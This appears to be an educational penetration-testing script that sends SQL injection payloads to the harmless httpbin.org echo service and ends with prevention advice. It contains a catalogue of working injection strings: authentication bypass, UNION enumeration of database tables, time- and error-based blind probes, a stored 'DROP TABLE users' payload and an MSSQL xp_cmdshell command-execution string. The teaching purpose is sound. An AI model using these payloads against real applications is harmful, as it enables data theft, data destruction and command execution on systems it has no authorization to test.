# Penetration Testing Demo 1: SQL Injection Testing
# ETHICAL USE ONLY - Test your own systems or authorized targets only
# Read ETHICAL_USE_AGREEMENT.md before using

print "💉 === Penetration Testing Demo 1: SQL Injection Testing ==="
print "⚠️ ETHICAL USE ONLY - Authorized testing environments only"
print "🎯 Target: Testing APIs for SQL injection vulnerabilities"

# ============================================================================
# ETHICAL TESTING DISCLAIMER
# ============================================================================
print ""
print "🔒 ETHICAL TESTING REQUIREMENTS:"
print "✅ Use only on systems you own or have written permission to test"
print "✅ Document all testing activities"
print "✅ Follow responsible disclosure for real vulnerabilities"
print "❌ NEVER test unauthorized systems"
print "❌ NEVER use for malicious purposes"

# Test endpoints - using httpbin for safe demonstration
set $safe_test_base "https://httpbin.org"
set $demo_api "https://jsonplaceholder.typicode.com"

# ============================================================================
# SQL INJECTION TEST 1: BASIC INJECTION PATTERNS
# ============================================================================
print ""
print "🔍 Test 1: Basic SQL Injection Pattern Testing"
print "Testing common SQL injection patterns (educational/defensive)"

# Test 1A: Classic SQL injection patterns (safe testing)
set $basic_sql_test "admin' OR '1'='1"
set $union_sql_test "1' UNION SELECT null,null,null--"
set $comment_sql_test "admin'--"

print "Testing basic SQL injection patterns..."

# Safe testing - these won't actually cause SQL injection on httpbin
POST "$safe_test_base/post" json {
    "username": "$basic_sql_test",
    "password": "password",
    "test_type": "basic_sql_injection",
    "note": "This is educational testing only"
}
    header "X-Pentest-Type" "sql-injection-basic"
    header "X-Test-Purpose" "vulnerability-assessment"
    header "Content-Type" "application/json"

assert status 200
print "✅ Basic SQL injection pattern tested (httpbin safe)"

# Test 1B: Numeric injection patterns
set $numeric_sql_test "1 OR 1=1"
set $numeric_union_test "1 UNION SELECT 1,2,3"

POST "$safe_test_base/post" json {
    "user_id": "$numeric_sql_test",
    "action": "login",
    "test_type": "numeric_sql_injection"
}
    header "X-Pentest-Type" "sql-injection-numeric"

assert status 200
print "✅ Numeric SQL injection pattern tested"

# ============================================================================
# SQL INJECTION TEST 2: TIME-BASED BLIND INJECTION
# ============================================================================
print ""
print "⏰ Test 2: Time-Based Blind SQL Injection Testing"

# Time-based injection patterns (educational)
set $time_based_sql "1' AND SLEEP(1)--"
set $conditional_time_sql "1' AND IF(1=1,SLEEP(1),0)--"

print "Testing time-based blind SQL injection patterns..."

POST "$safe_test_base/post" json {
    "query_param": "$time_based_sql",
    "test_type": "time_based_blind",
    "note": "Testing for time-based SQL injection vulnerabilities"
}
    header "X-Pentest-Type" "sql-injection-time-based"
    header "X-Expected-Delay" "none-httpbin-safe"

assert status 200
# Note: We don't test actual time delays as httpbin doesn't have SQL backend
print "✅ Time-based injection pattern tested (safe environment)"

# ============================================================================
# SQL INJECTION TEST 3: BOOLEAN-BASED BLIND INJECTION
# ============================================================================
print ""
print "🔢 Test 3: Boolean-Based Blind SQL Injection Testing"

set $boolean_true_sql "1' AND '1'='1"
set $boolean_false_sql "1' AND '1'='2"
set $boolean_length_sql "1' AND LENGTH(database())>1--"

print "Testing boolean-based blind SQL injection..."

# Test true condition
POST "$safe_test_base/post" json {
    "condition_test": "$boolean_true_sql",
    "expected_result": "true_condition",
    "test_type": "boolean_blind_true"
}
    header "X-Pentest-Type" "sql-injection-boolean-true"

assert status 200
print "✅ Boolean true condition tested"

# Test false condition
POST "$safe_test_base/post" json {
    "condition_test": "$boolean_false_sql",
    "expected_result": "false_condition",
    "test_type": "boolean_blind_false"
}
    header "X-Pentest-Type" "sql-injection-boolean-false"

assert status 200
print "✅ Boolean false condition tested"

# ============================================================================
# SQL INJECTION TEST 4: UNION-BASED INJECTION
# ============================================================================
print ""
print "🔗 Test 4: UNION-Based SQL Injection Testing"

set $union_select_sql "1' UNION SELECT 1,2,3,4,5--"
set $union_info_sql "1' UNION SELECT database(),user(),version()--"
set $union_tables_sql "1' UNION SELECT table_name FROM information_schema.tables--"

print "Testing UNION-based SQL injection patterns..."

POST "$safe_test_base/post" json {
    "union_test": "$union_select_sql",
    "test_purpose": "column_enumeration",
    "test_type": "union_based"
}
    header "X-Pentest-Type" "sql-injection-union"
    header "X-Union-Columns" "5"

assert status 200
print "✅ UNION-based injection pattern tested"

# Information gathering simulation
POST "$safe_test_base/post" json {
    "info_gathering": "$union_info_sql",
    "target_info": "database_version_user",
    "test_type": "union_info_gathering"
}
    header "X-Pentest-Type" "sql-injection-info-gathering"

assert status 200
print "✅ Information gathering pattern tested"

# ============================================================================
# SQL INJECTION TEST 5: SECOND-ORDER INJECTION
# ============================================================================
print ""
print "🔄 Test 5: Second-Order SQL Injection Testing"

set $stored_payload "user123'; DROP TABLE users;--"
set $trigger_payload "SELECT * FROM profiles WHERE user='user123'"

print "Testing second-order SQL injection patterns..."

# First request - store potentially malicious data
POST "$safe_test_base/post" json {
    "username": "$stored_payload",
    "profile_data": "This data gets stored and processed later",
    "test_type": "second_order_storage"
}
    header "X-Pentest-Type" "sql-injection-second-order-store"

assert status 200
print "✅ Second-order storage phase tested"

# Second request - trigger the stored payload
POST "$safe_test_base/post" json {
    "action": "retrieve_profile",
    "user_lookup": "user123",
    "test_type": "second_order_trigger"
}
    header "X-Pentest-Type" "sql-injection-second-order-trigger"

assert status 200
print "✅ Second-order trigger phase tested"

# ============================================================================
# SQL INJECTION TEST 6: ERROR-BASED INJECTION
# ============================================================================
print ""
print "⚠️ Test 6: Error-Based SQL Injection Testing"

set $error_mysql "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
set $error_mssql "1'; EXEC xp_cmdshell('dir');--"
set $error_oracle "1' AND (SELECT UPPER(XMLType(CHR(60)||CHR(58)||(SELECT user FROM dual)||CHR(62))) FROM dual) IS NULL--"

print "Testing error-based SQL injection patterns..."

POST "$safe_test_base/post" json {
    "mysql_error_test": "$error_mysql",
    "database_type": "mysql",
    "test_type": "error_based_mysql"
}
    header "X-Pentest-Type" "sql-injection-error-mysql"

assert status 200
print "✅ MySQL error-based pattern tested"

POST "$safe_test_base/post" json {
    "mssql_error_test": "$error_mssql", 
    "database_type": "mssql",
    "test_type": "error_based_mssql"
}
    header "X-Pentest-Type" "sql-injection-error-mssql"

assert status 200
print "✅ MSSQL error-based pattern tested"

# ============================================================================
# TESTING SUMMARY AND RECOMMENDATIONS
# ============================================================================
print ""
print "📊 === SQL Injection Testing Summary ==="
print "════════════════════════════════════════"

print "SQL Injection Patterns Tested:"
print "✅ Basic injection (OR '1'='1)"
print "✅ Numeric injection (1 OR 1=1)"
print "✅ Time-based blind (SLEEP functions)"
print "✅ Boolean-based blind (true/false conditions)"
print "✅ UNION-based (UNION SELECT)"
print "✅ Second-order (stored payload execution)"
print "✅ Error-based (database-specific errors)"

print ""
print "🛡️ SQL Injection Prevention Measures to Implement:"
print "• Use parameterized queries/prepared statements"
print "• Input validation and sanitization"
print "• Least privilege database permissions"
print "• Web Application Firewall (WAF)"
print "• Regular security code reviews"
print "• Database activity monitoring"

print ""
print "🔍 What to Look For in Real Testing:"
print "• Different response times (time-based)"
print "• Different response content (boolean-based)"
print "• Database error messages (error-based)"
print "• Successful data extraction (UNION-based)"
print "• Command execution (advanced injection)"

print ""
print "⚠️ IMPORTANT REMINDERS:"
print "• These tests were performed on safe endpoints (httpbin)"
print "• Real SQL injection testing should only be done on authorized systems"
print "• Always follow responsible disclosure for real vulnerabilities"
print "• Document all testing activities thoroughly"
print "• Obtain written permission before testing any system"

print ""
print "🎯 Next Steps for Real Testing:"
print "• Set up vulnerable testing environments (DVWA, SQLi-labs)"
print "• Use specialized tools (SQLMap, Burp Suite, OWASP ZAP)"
print "• Learn about different database systems and their syntax"
print "• Practice on authorized penetration testing platforms"

print ""
print "✅ Penetration Testing Demo 1 completed - SQL Injection patterns!"
print "🔒 Remember: Use these techniques only for ethical security testing"